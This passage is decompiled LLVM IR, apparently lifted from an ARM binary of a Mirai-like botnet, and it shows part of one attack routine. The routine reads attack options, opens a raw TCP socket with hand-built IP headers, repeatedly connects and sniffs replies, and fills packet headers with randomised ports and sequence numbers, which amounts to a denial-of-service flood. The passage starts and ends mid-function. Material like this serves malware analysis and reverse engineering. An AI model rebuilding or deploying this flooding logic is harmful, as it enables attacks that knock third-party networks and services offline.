  %v0_99e8 = load i32, i32* @r5, align 4
  store i32 %v0_99e8, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_99f4 = load i32, i32* @r4, align 4
  store i32 %v0_99f4, i32* %r0.global-to-local, align 4
  %v5_99fc = inttoptr i32 %v0_99e8 to i32*
  %v6_99fc = call i32 @attack_get_opt_int(i32 %v0_99f4, i32* %v5_99fc, i32 12, i32 1, i32 %v1_99e4)
  %v1_9a04 = urem i32 %v6_99fc, 256
  store i32 %v1_9a04, i32* %ip.global-to-local, align 4
  %v0_9a08 = load i32, i32* @r5, align 4
  store i32 %v0_9a08, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9a14 = load i32, i32* @r4, align 4
  store i32 %v0_9a14, i32* %r0.global-to-local, align 4
  %v5_9a1c = inttoptr i32 %v0_9a08 to i32*
  %v6_9a1c = call i32 @attack_get_opt_int(i32 %v0_9a14, i32* %v5_9a1c, i32 13, i32 1, i32 %v1_9a04)
  %v1_9a24 = urem i32 %v6_9a1c, 256
  store i32 %v1_9a24, i32* %ip.global-to-local, align 4
  %v0_9a28 = load i32, i32* @r5, align 4
  store i32 %v0_9a28, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9a34 = load i32, i32* @r4, align 4
  store i32 %v0_9a34, i32* %r0.global-to-local, align 4
  %v5_9a3c = inttoptr i32 %v0_9a28 to i32*
  %v6_9a3c = call i32 @attack_get_opt_int(i32 %v0_9a34, i32* %v5_9a3c, i32 14, i32 1, i32 %v1_9a24)
  %v1_9a44 = urem i32 %v6_9a3c, 256
  store i32 %v1_9a44, i32* %ip.global-to-local, align 4
  %v0_9a48 = load i32, i32* @r5, align 4
  store i32 %v0_9a48, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9a54 = load i32, i32* @r4, align 4
  store i32 %v0_9a54, i32* %r0.global-to-local, align 4
  %v5_9a5c = inttoptr i32 %v0_9a48 to i32*
  %v6_9a5c = call i32 @attack_get_opt_int(i32 %v0_9a54, i32* %v5_9a5c, i32 15, i32 1, i32 %v1_9a44)
  %v1_9a64 = urem i32 %v6_9a5c, 256
  store i32 %v1_9a64, i32* %ip.global-to-local, align 4
  %v0_9a68 = load i32, i32* @r5, align 4
  store i32 %v0_9a68, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9a74 = load i32, i32* @r4, align 4
  store i32 %v0_9a74, i32* %r0.global-to-local, align 4
  %v5_9a7c = inttoptr i32 %v0_9a68 to i32*
  %v6_9a7c = call i32 @attack_get_opt_int(i32 %v0_9a74, i32* %v5_9a7c, i32 16, i32 1, i32 %v1_9a64)
  %v1_9a84 = urem i32 %v6_9a7c, 256
  store i32 %v1_9a84, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_9a90 = load i32, i32* @r5, align 4
  store i32 %v0_9a90, i32* %r1.global-to-local, align 4
  %v0_9a94 = load i32, i32* @r4, align 4
  store i32 %v0_9a94, i32* %r0.global-to-local, align 4
  %v5_9a9c = inttoptr i32 %v0_9a90 to i32*
  %v6_9a9c = call i32 @attack_get_opt_int(i32 %v0_9a94, i32* %v5_9a9c, i32 0, i32 768, i32 %v1_9a84)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9aac = load i32, i32* @r5, align 4
  store i32 %v0_9aac, i32* %r1.global-to-local, align 4
  %v0_9ab0 = load i32, i32* @r4, align 4
  store i32 %v0_9ab0, i32* %r0.global-to-local, align 4
  %v5_9ab4 = inttoptr i32 %v0_9aac to i32*
  %v6_9ab4 = call i32 @attack_get_opt_int(i32 %v0_9ab0, i32* %v5_9ab4, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_9abc = urem i32 %v6_9ab4, 256
  store i32 %v1_9abc, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_9ad0 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_9ad0, i32* %r0.global-to-local, align 4
  %v7_9ad4 = icmp eq i32 %v3_9ad0, -1
  store i1 %v7_9ad4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_9ad0, i32* @sb, align 4
  br i1 %v7_9ad4, label %dec_label_pc_9cc4, label %dec_label_pc_9ae0

dec_label_pc_9ae0:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_9ae8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_9ae8, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_9afc = call i32 @__GI_setsockopt(i32 %v3_9ad0, i32 0, i32 3, i32 %v6_9ae8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_9afc, i32* %r0.global-to-local, align 4
  %v7_9b00 = icmp eq i32 %v5_9afc, -1
  store i1 %v7_9b00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9b00, label %dec_label_pc_9cbc, label %dec_label_pc_9b08

dec_label_pc_9b08:                                ; preds = %dec_label_pc_9ae0
  %v0_9b08 = load i32, i32* @r7, align 4
  %v3_9b08 = mul i32 %v0_9b08, 65536
  store i32 %v3_9b08, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r3, align 4
  %v0_9b10 = load i32, i32* @r6, align 4
  %v2_9b10 = icmp eq i32 %v0_9b10, 0
  store i1 %v2_9b10, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_9b18 = urem i32 %v0_9b08, 65536
  store i32 %v3_9b18, i32* @fp, align 4
  br i1 %v2_9b10, label %dec_label_pc_9f48, label %dec_label_pc_9b20.preheader

dec_label_pc_9b20.preheader:                      ; preds = %dec_label_pc_9b08
  %v2_9b6c = ptrtoint i32* %stack_var_-144 to i32
  %v2_9bb0 = ptrtoint i32* %stack_var_-64 to i32
  %v2_9be8 = ptrtoint i32* %stack_var_-80 to i32
  %v2_9bf4 = ptrtoint i32* %stack_var_-336 to i32
  %v2_9bf8 = ptrtoint i32* %stack_var_-48 to i32
  %v4_9c58 = zext i8 %tmp to i32
  %v1_9c5c = and i32 %v4_9c58, 18
  %v2_9c60 = icmp eq i32 %v1_9c5c, 18
  %v3_9c44 = sext i16 %tmp61 to i32
  %v1_9c68 = and i32 %v4_9c58, 5
  %v2_9c68 = icmp eq i32 %v1_9c68, 0
  %v4_9ba8 = add i32 %v2_9b6c, 82
  %v5_9ba8 = inttoptr i32 %v4_9ba8 to i16*
  %v1_9d98 = add i32 %v6_9a9c, 40
  %v1_9eac = urem i32 %v6_99dc, 2
  %tmp97 = sub nsw i32 0, %v1_9eac
  %v4_9eb4 = and i32 %tmp97, 32
  %v1_9ec4 = urem i32 %v6_99fc, 2
  %tmp98 = sub nsw i32 0, %v1_9ec4
  %v4_9ecc = and i32 %tmp98, 16
  %v1_9edc = urem i32 %v6_9a1c, 2
  %tmp99 = sub nsw i32 0, %v1_9edc
  %v4_9ee4 = and i32 %tmp99, 8
  %v1_9ef4 = urem i32 %v6_9a3c, 2
  %tmp100 = sub nsw i32 0, %v1_9ef4
  %v4_9efc = and i32 %tmp100, 4
  %v1_9f0c = urem i32 %v6_9a5c, 2
  %tmp101 = sub nsw i32 0, %v1_9f0c
  %v3_9f14 = and i32 %tmp101, 2
  %v1_9f24 = urem i32 %v6_9a7c, 2
  br label %dec_label_pc_9b20

dec_label_pc_9b20:                                ; preds = %dec_label_pc_9b20.preheader, %dec_label_pc_9c94
  %stack_var_-62.0 = phi i16 [ %stack_var_-62.3, %dec_label_pc_9c94 ], [ %tmp34, %dec_label_pc_9b20.preheader ]
  %stack_var_-60.0 = phi i32 [ %stack_var_-60.4, %dec_label_pc_9c94 ], [ %tmp37, %dec_label_pc_9b20.preheader ]
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_9b2c = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_9b2c, i32* %r0.global-to-local, align 4
  %v7_9b30 = icmp eq i32 %v3_9b2c, -1
  store i1 %v7_9b30, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_9b2c, i32* @r5, align 4
  br i1 %v7_9b30, label %dec_label_pc_9c94, label %dec_label_pc_9b3c

dec_label_pc_9b3c:                                ; preds = %dec_label_pc_9b20, %dec_label_pc_9c70
  %v0_9b44 = phi i32 [ %v3_9c84, %dec_label_pc_9c70 ], [ %v3_9b2c, %dec_label_pc_9b20 ]
  %stack_var_-62.1 = phi i16 [ %stack_var_-62.2, %dec_label_pc_9c70 ], [ %stack_var_-62.0, %dec_label_pc_9b20 ]
  %stack_var_-60.1 = phi i32 [ %v0_9d44, %dec_label_pc_9c70 ], [ %stack_var_-60.0, %dec_label_pc_9b20 ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_9b44 = call i32 @__libc_fcntl(i32 %v0_9b44, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_9b4c = or i32 %v2_9b44, 2048
  store i32 %v1_9b4c, i32* @r2, align 4
  %v0_9b50 = load i32, i32* @r5, align 4
  store i32 %v0_9b50, i32* %r0.global-to-local, align 4
  %v2_9b54 = call i32 @__libc_fcntl(i32 %v0_9b50, i32 4)
  %v3_9b58 = load i32, i32* %stack_var_-44, align 4
  %v5_9b60 = mul i32 %v3_9b58, 24
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  store i32 %v2_9b6c, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  %v2_9b74 = add i32 %v5_9b60, %arg2
  store i32 %v2_9b74, i32* %r3.global-to-local, align 4
  %v1_9b78 = add i32 %v2_9b74, 20
  %v2_9b78 = inttoptr i32 %v1_9b78 to i8*
  %v3_9b78 = load i8, i8* %v2_9b78, align 1
  %v4_9b78 = zext i8 %v3_9b78 to i32
  store i32 %v4_9b78, i32* %r2.global-to-local, align 4
  %v2_9b7c = icmp ugt i8 %v3_9b78, 30
  %v7_9b7c = icmp eq i8 %v3_9b78, 31
  store i1 %v7_9b7c, i1* %cpsr_z.global-to-local, align 1
  %v2_9b80 = xor i1 %v7_9b7c, true
  %v3_9b80 = and i1 %v2_9b7c, %v2_9b80
  br i1 %v3_9b80, label %bb, label %bb71

bb:                                               ; preds = %dec_label_pc_9b3c
  %v5_9b80 = add i32 %v2_9b74, 16
  %v6_9b80 = inttoptr i32 %v5_9b80 to i32*
  %v7_9b80 = load i32, i32* %v6_9b80, align 4
  store i32 %v7_9b80, i32* %r3.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %dec_label_pc_9b3c, %bb
  %v4_9b84 = phi i32 [ %v2_9b74, %dec_label_pc_9b3c ], [ %v7_9b80, %bb ]
  %v4_9b84.stack_var_-60.1 = select i1 %v3_9b80, i32 %v4_9b84, i32 %stack_var_-60.1
  %v2_9b88 = xor i1 %v2_9b7c, true
  %v3_9b88 = or i1 %v7_9b7c, %v2_9b88
  br i1 %v3_9b88, label %dec_label_pc_9cd0, label %dec_label_pc_9b8c

dec_label_pc_9b8c:                                ; preds = %bb71, %dec_label_pc_9cd0
  %v0_9d44 = phi i32 [ %v5_9d20, %dec_label_pc_9cd0 ], [ %v4_9b84.stack_var_-60.1, %bb71 ]
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_9b94 = load i32, i32* @sl, align 4
  %v9_9b94 = icmp eq i32 %v0_9b94, 65535
  store i1 %v9_9b94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9b94, label %dec_label_pc_9d2c, label %.thread9

.thread9:                                         ; preds = %dec_label_pc_9b8c
  %v4_9b98 = udiv i32 %v0_9b94, 256
  %v2_9b9c = urem i32 %v0_9b94, 256
  store i32 %v2_9b9c, i32* %r2.global-to-local, align 4
  %v5_9ba0 = mul nuw nsw i32 %v2_9b9c, 256
  %v6_9ba0 = or i32 %v5_9ba0, %v4_9b98
  store i32 %v6_9ba0, i32* %r3.global-to-local, align 4
  store i32 %v2_9b6c, i32* %r0.global-to-local, align 4
  %v2_9ba8 = trunc i32 %v6_9ba0 to i16
  store i16 %v2_9ba8, i16* %v5_9ba8, align 2
  br label %dec_label_pc_9bb0

dec_label_pc_9bb0:                                ; preds = %.thread9, %dec_label_pc_9d2c
  %stack_var_-62.2 = phi i16 [ %v1_9d2c, %dec_label_pc_9d2c ], [ %stack_var_-62.1, %.thread9 ]
  store i32 %v2_9bb0, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_9bb8 = load i32, i32* @r5, align 4
  store i32 %v0_9bb8, i32* %r0.global-to-local, align 4
  %v3_9bbc = call i32 @__libc_connect(i32 %v0_9bb8, i32 %v2_9bb0, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_9bc4 = call i32 @__GI_time(i32* null)
  store i32 %v2_9bc4, i32* %r0.global-to-local, align 4
  store i32 %v2_9bc4, i32* @r4, align 4
  %v9_9c24 = icmp eq i32 %tmp35, %v0_9d44
  %v4_9c4c = zext i16 %stack_var_-62.2 to i32
  %. = zext i1 %v9_9c24 to i32
  %v9_9c38 = icmp eq i1 %v9_9c24, false
  %v9_9c50 = icmp eq i32 %v3_9c44, %v4_9c4c
  br label %dec_label_pc_9be0

dec_label_pc_9bd0:                                ; preds = %.thread, %dec_label_pc_9c40, %dec_label_pc_9c68, %bb75
  %v2_9bd0 = call i32 @__GI_time(i32* null)
  %v0_9bd4 = load i32, i32* @r4, align 4
  %v2_9bd4 = sub i32 %v2_9bd0, %v0_9bd4
  store i32 %v2_9bd4, i32* %r0.global-to-local, align 4
  %v7_9bd8 = icmp eq i32 %v2_9bd4, 10
  store i1 %v7_9bd8, i1* %cpsr_z.global-to-local, align 1
  %v8_9bdc = icmp sgt i32 %v2_9bd4, 10
  br i1 %v8_9bdc, label %dec_label_pc_9c70, label %dec_label_pc_9be0

dec_label_pc_9be0:                                ; preds = %dec_label_pc_9bd0, %dec_label_pc_9bb0
  store i32 16, i32* %stack_var_-48, align 4
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 %v2_9bf4, i32* %r1.global-to-local, align 4
  store i32 %v2_9bf8, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_9c00 = load i32, i32* @sb, align 4
  store i32 %v0_9c00, i32* %r0.global-to-local, align 4
  %v6_9c08 = call i32 @__libc_recvfrom(i32 %v0_9c00, i32 %v2_9bf4, i32 256, i32 16384, i32 %v2_9be8, i32 %v2_9bf8)
  store i32 %v6_9c08, i32* %r2.global-to-local, align 4
  %v7_9c10 = icmp eq i32 %v6_9c08, -1
  store i1 %v7_9c10, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_9c10, label %dec_label_pc_9cc4, label %dec_label_pc_9c1c

dec_label_pc_9c1c:                                ; preds = %dec_label_pc_9be0
  store i32 %v0_9d44, i32* @r1, align 4
  store i32 %tmp35, i32* @r3, align 4
  store i32 %., i32* %ip.global-to-local, align 4
  %v7_9c30 = icmp eq i32 %v6_9c08, 40
  store i1 %v7_9c30, i1* %cpsr_z.global-to-local, align 1
  %tmp102 = icmp ult i32 %v6_9c08, 41
  br i1 %tmp102, label %.thread, label %bb75

.thread:                                          ; preds = %dec_label_pc_9c1c
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_9bd0

bb75:                                             ; preds = %dec_label_pc_9c1c
  store i1 %v9_9c38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9c38, label %dec_label_pc_9bd0, label %dec_label_pc_9c40

dec_label_pc_9c40:                                ; preds = %bb75
  store i32 %v3_9c44, i32* @lr, align 4
  store i32 %v2_9b6c, i32* @r3, align 4
  store i32 %v4_9c4c, i32* %r2.global-to-local, align 4
  store i1 %v9_9c50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9c50, label %dec_label_pc_9c58, label %dec_label_pc_9bd0

dec_label_pc_9c58:                                ; preds = %dec_label_pc_9c40
  store i32 %v4_9c58, i32* %r2.global-to-local, align 4
  store i32 %v1_9c5c, i32* @r3, align 4
  store i1 %v2_9c60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9c60, label %dec_label_pc_9d3c, label %dec_label_pc_9c68

dec_label_pc_9c68:                                ; preds = %dec_label_pc_9c58
  store i1 %v2_9c68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9c68, label %dec_label_pc_9bd0, label %dec_label_pc_9c70

dec_label_pc_9c70:                                ; preds = %dec_label_pc_9c68, %dec_label_pc_9bd0
  %v0_9c70 = load i32, i32* @r5, align 4
  store i32 %v0_9c70, i32* %r0.global-to-local, align 4
  %v1_9c74 = call i32 @__GI___libc_close(i32 %v0_9c70)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_9c84 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_9c84, i32* %r0.global-to-local, align 4
  %v3_9c88 = icmp eq i32 %v3_9c84, -1
  %v8_9c88 = icmp eq i32 %v3_9c84, -1
  store i1 %v8_9c88, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_9c84, i32* @r5, align 4
  br i1 %v3_9c88, label %dec_label_pc_9c94, label %dec_label_pc_9b3c

dec_label_pc_9c94:                                ; preds = %dec_label_pc_9c70, %dec_label_pc_9b20, %bb82
  %stack_var_-62.3 = phi i16 [ %stack_var_-62.0, %dec_label_pc_9b20 ], [ %stack_var_-62.2, %bb82 ], [ %stack_var_-62.2, %dec_label_pc_9c70 ]
  %stack_var_-60.4 = phi i32 [ %stack_var_-60.0, %dec_label_pc_9b20 ], [ %v0_9d44, %bb82 ], [ %v0_9d44, %dec_label_pc_9c70 ]
  %v3_9c94 = load i32, i32* %stack_var_-44, align 4
  %v1_9c98 = add i32 %v3_9c94, 1
  store i32 %v1_9c98, i32* @r3, align 4
  %v1_9c9c = load i32, i32* @r6, align 4
  %v9_9c9c = icmp eq i32 %v1_9c98, %v1_9c9c
  store i1 %v9_9c9c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_9c98, i32* %stack_var_-44, align 4
  %v5_9ca4 = icmp slt i32 %v1_9c98, %v1_9c9c
  br i1 %v5_9ca4, label %dec_label_pc_9b20, label %dec_label_pc_9ca8

dec_label_pc_9ca8:                                ; preds = %dec_label_pc_9c94
  store i32 %v6_9a9c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9f58

dec_label_pc_9cbc:                                ; preds = %dec_label_pc_9ae0
  %v0_9cbc = load i32, i32* @sb, align 4
  store i32 %v0_9cbc, i32* %r0.global-to-local, align 4
  %v1_9cc0 = call i32 @__GI___libc_close(i32 %v0_9cbc)
  store i32 %v1_9cc0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9cc4

dec_label_pc_9cc4:                                ; preds = %dec_label_pc_9be0, %entry, %dec_label_pc_9cbc
  %v1_9ccc = phi i32 [ %v3_9ad0, %entry ], [ %v1_9cc0, %dec_label_pc_9cbc ], [ 0, %dec_label_pc_9be0 ]
  store i32 %v27_98fc, i32* %lr.global-to-local, align 4
  ret i32 %v1_9ccc

dec_label_pc_9cd0:                                ; preds = %bb71
  %v1_9cd0 = add i32 %v4_9b84, 16
  %v2_9cd0 = inttoptr i32 %v1_9cd0 to i32*
  %v3_9cd0 = load i32, i32* %v2_9cd0, align 4
  store i32 %v3_9cd0, i32* @r4, align 4
  %v0_9cd4 = call i32 @rand_next()
  store i32 %v0_9cd4, i32* %r0.global-to-local, align 4
  %v3_9cd8 = load i32, i32* %stack_var_-44, align 4
  %v5_9ce0 = mul i32 %v3_9cd8, 24
  %v0_9ce8 = load i32, i32* @r4, align 4
  %v1_9ce8 = and i32 %v0_9ce8, 16711680
  store i32 %v1_9ce8, i32* %ip.global-to-local, align 4
  %v3_9cec = udiv i32 %v0_9ce8, 16777216
  %v2_9cf0 = add i32 %v5_9ce0, %arg2
  store i32 %v2_9cf0, i32* %r1.global-to-local, align 4
  %v4_9cf4 = udiv i32 %v1_9ce8, 256
  %v5_9cf4 = or i32 %v4_9cf4, %v3_9cec
  store i32 %v5_9cf4, i32* %r2.global-to-local, align 4
  %v1_9cf8 = and i32 %v0_9ce8, 65280
  store i32 %v1_9cf8, i32* %r3.global-to-local, align 4
  %v1_9cfc = add i32 %v2_9cf0, 20
  %v2_9cfc = inttoptr i32 %v1_9cfc to i8*
  %v3_9cfc = load i8, i8* %v2_9cfc, align 1
  %v4_9cfc = zext i8 %v3_9cfc to i32
  store i32 %v4_9cfc, i32* %ip.global-to-local, align 4
  %v5_9d04 = call i32 @llvm.bswap.i32(i32 %v0_9ce8)
  %v7_9d08 = lshr i32 %v0_9cd4, %v4_9cfc
  %v8_9d08 = add i32 %v7_9d08, %v5_9d04
  store i32 %v8_9d08, i32* %r2.global-to-local, align 4
  %v1_9d0c = and i32 %v8_9d08, 16711680
  store i32 %v1_9d0c, i32* %r0.global-to-local, align 4
  %v1_9d18 = and i32 %v8_9d08, 65280
  store i32 %v1_9d18, i32* %r1.global-to-local, align 4
  %v5_9d20 = call i32 @llvm.bswap.i32(i32 %v8_9d08)
  store i32 %v5_9d20, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9b8c

dec_label_pc_9d2c:                                ; preds = %dec_label_pc_9b8c
  %v0_9d2c = call i32 @rand_next()
  %v1_9d2c = trunc i32 %v0_9d2c to i16
  store i32 %v0_9d2c, i32* %r0.global-to-local, align 4
  store i32 %v2_9b6c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_9bb0

dec_label_pc_9d3c:                                ; preds = %dec_label_pc_9c58
  %v3_9d3c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9d3c, i32* @r4, align 4
  store i32 %v2_9918, i32* %ip.global-to-local, align 4
  %v5_9d44 = mul i32 %v3_9d3c, 16
  %v6_9d44 = add i32 %v5_9d44, %v2_9918
  %v7_9d44 = inttoptr i32 %v6_9d44 to i32*
  store i32 %v0_9d44, i32* %v7_9d44, align 4
  %v0_9d48 = load i32, i32* @r8, align 4
  %v1_9d48 = add i32 %v0_9d48, 4
  %v2_9d48 = inttoptr i32 %v1_9d48 to i32*
  %v3_9d48 = load i32, i32* %v2_9d48, align 4
  store i32 %v3_9d48, i32* %r1.global-to-local, align 4
  %v1_9d54 = and i32 %v3_9d48, 65280
  store i32 %v1_9d54, i32* %r2.global-to-local, align 4
  store i32 %v2_9918, i32* %r0.global-to-local, align 4
  %v0_9d64 = load i32, i32* @r4, align 4
  %v3_9d64 = mul i32 %v0_9d64, 16
  %v2_9d68 = add i32 %v3_9d64, %v2_9918
  store i32 %v2_9d68, i32* %ip.global-to-local, align 4
  %v5_9d6c = call i32 @llvm.bswap.i32(i32 %v3_9d48)
  store i32 %v5_9d6c, i32* %r3.global-to-local, align 4
  %v2_9d70 = add i32 %v2_9d68, 4
  %v3_9d70 = inttoptr i32 %v2_9d70 to i32*
  store i32 %v5_9d6c, i32* %v3_9d70, align 4
  %v0_9d74 = load i32, i32* @r8, align 4
  %v1_9d74 = add i32 %v0_9d74, 8
  %v2_9d74 = inttoptr i32 %v1_9d74 to i32*
  %v3_9d74 = load i32, i32* %v2_9d74, align 4
  store i32 %v3_9d74, i32* %r1.global-to-local, align 4
  %v1_9d78 = and i32 %v3_9d74, 16711680
  store i32 %v1_9d78, i32* %r0.global-to-local, align 4
  store i32 %v6_9a9c, i32* %r2.global-to-local, align 4
  %v5_9d90 = call i32 @llvm.bswap.i32(i32 %v3_9d74)
  store i32 %v5_9d90, i32* %r3.global-to-local, align 4
  %v1_9d94 = add i32 %v0_9d74, 2
  %v2_9d94 = inttoptr i32 %v1_9d94 to i16*
  %v3_9d94 = load i16, i16* %v2_9d94, align 2
  %v4_9d94 = zext i16 %v3_9d94 to i32
  store i32 %v4_9d94, i32* %r1.global-to-local, align 4
  store i32 %v1_9d98, i32* @r7, align 4
  %v0_9d9c = load i32, i32* @lr, align 4
  %v1_9d9c = trunc i32 %v0_9d9c to i16
  %v2_9d9c = load i32, i32* %ip.global-to-local, align 4
  %v3_9d9c = add i32 %v2_9d9c, 14
  %v4_9d9c = inttoptr i32 %v3_9d9c to i16*
  store i16 %v1_9d9c, i16* %v4_9d9c, align 2
  %v0_9da0 = load i32, i32* %r1.global-to-local, align 4
  %v1_9da0 = trunc i32 %v0_9da0 to i16
  %v2_9da0 = load i32, i32* %ip.global-to-local, align 4
  %v3_9da0 = add i32 %v2_9da0, 12
  %v4_9da0 = inttoptr i32 %v3_9da0 to i16*
  store i16 %v1_9da0, i16* %v4_9da0, align 2
  %v0_9da4 = load i32, i32* %r3.global-to-local, align 4
  %v1_9da4 = load i32, i32* %ip.global-to-local, align 4
  %v2_9da4 = add i32 %v1_9da4, 8
  %v3_9da4 = inttoptr i32 %v2_9da4 to i32*
  store i32 %v0_9da4, i32* %v3_9da4, align 4
  %v0_9da8 = load i32, i32* @r7, align 4
  store i32 %v0_9da8, i32* @r0, align 4
  %v0_9dac = call i32 @malloc()
  store i32 %v0_9dac, i32* %r0.global-to-local, align 4
  store i32 %v2_9928, i32* %r3.global-to-local, align 4
  %v2_9db8 = load i32, i32* @r4, align 4
  %v5_9db8 = mul i32 %v2_9db8, 4
  %v6_9db8 = add i32 %v5_9db8, %v2_9928
  %v7_9db8 = inttoptr i32 %v6_9db8 to i32*
  store i32 %v0_9dac, i32* %v7_9db8, align 4
  %v3_9dbc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9dbc, i32* %r2.global-to-local, align 4
  %v0_9dc0 = load i32, i32* %r3.global-to-local, align 4
  %v4_9dc0 = mul i32 %v3_9dbc, 4
  %v5_9dc0 = add i32 %v0_9dc0, %v4_9dc0
  %v6_9dc0 = inttoptr i32 %v5_9dc0 to i32*
  %v7_9dc0 = load i32, i32* %v6_9dc0, align 4
  store i32 %v7_9dc0, i32* @r4, align 4
  %v1_9dc4 = inttoptr i32 %v7_9dc0 to i8*
  %v2_9dc4 = load i8, i8* %v1_9dc4, align 1
  %tmp103 = urem i8 %v2_9dc4, 16
  %v1_9dc8 = zext i8 %tmp103 to i32
  %v1_9dcc = or i32 %v1_9dc8, 64
  store i32 %v1_9dcc, i32* %r3.global-to-local, align 4
  %v1_9dd0 = trunc i32 %v1_9dcc to i8
  store i8 %v1_9dd0, i8* %v1_9dc4, align 1
  %v0_9dd4 = load i32, i32* @r4, align 4
  %v1_9dd4 = inttoptr i32 %v0_9dd4 to i8*
  %v2_9dd4 = load i8, i8* %v1_9dd4, align 1
  %v0_9dd8 = load i32, i32* @r7, align 4
  %tmp77 = mul i32 %v0_9dd8, 256
  %v1_9de0 = and i8 %v2_9dd4, -16
  %v1_9de4 = or i8 %v1_9de0, 5
  %v1_9de8 = and i32 %tmp77, 65280
  %tmp78 = udiv i32 %v0_9dd8, 256
  %v4_9dec = urem i32 %tmp78, 256
  %v5_9dec = or i32 %v4_9dec, %v1_9de8
  store i32 %v5_9dec, i32* %r2.global-to-local, align 4
  %v0_9df0 = load i32, i32* @fp, align 4
  %v1_9df0 = urem i32 %v0_9df0, 256
  store i32 %v1_9df0, i32* %r0.global-to-local, align 4
  store i32 %v1_99a8, i32* %ip.global-to-local, align 4
  %v3_9df8 = udiv i32 %v0_9df0, 256
  store i32 %v3_9df8, i32* %r1.global-to-local, align 4
  store i8 %v1_9de4, i8* %v1_9dd4, align 1
  %v0_9e00 = load i32, i32* %r1.global-to-local, align 4
  %v1_9e00 = load i32, i32* %r0.global-to-local, align 4
  %v4_9e00 = mul i32 %v1_9e00, 256
  %v5_9e00 = or i32 %v4_9e00, %v0_9e00
  store i32 %v5_9e00, i32* %r1.global-to-local, align 4
  store i32 %v6_9940, i32* %r0.global-to-local, align 4
  %v2_9e08 = load i32, i32* @r4, align 4
  %v3_9e08 = add i32 %v2_9e08, 1
  %v4_9e08 = inttoptr i32 %v3_9e08 to i8*
  store i8 %v5_9960, i8* %v4_9e08, align 1
  %v0_9e0c = load i32, i32* %r1.global-to-local, align 4
  %v1_9e0c = trunc i32 %v0_9e0c to i16
  %v2_9e0c = load i32, i32* @r4, align 4
  %v3_9e0c = add i32 %v2_9e0c, 4
  %v4_9e0c = inttoptr i32 %v3_9e0c to i16*
  store i16 %v1_9e0c, i16* %v4_9e0c, align 2
  %v0_9e10 = load i32, i32* %ip.global-to-local, align 4
  %v2_9e10 = icmp eq i32 %v0_9e10, 0
  store i1 %v2_9e10, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_999c, i32* %r1.global-to-local, align 4
  %v0_9e18 = load i32, i32* %r2.global-to-local, align 4
  %v1_9e18 = trunc i32 %v0_9e18 to i16
  %v2_9e18 = load i32, i32* @r4, align 4
  %v3_9e18 = add i32 %v2_9e18, 2
  %v4_9e18 = inttoptr i32 %v3_9e18 to i16*
  store i16 %v1_9e18, i16* %v4_9e18, align 2
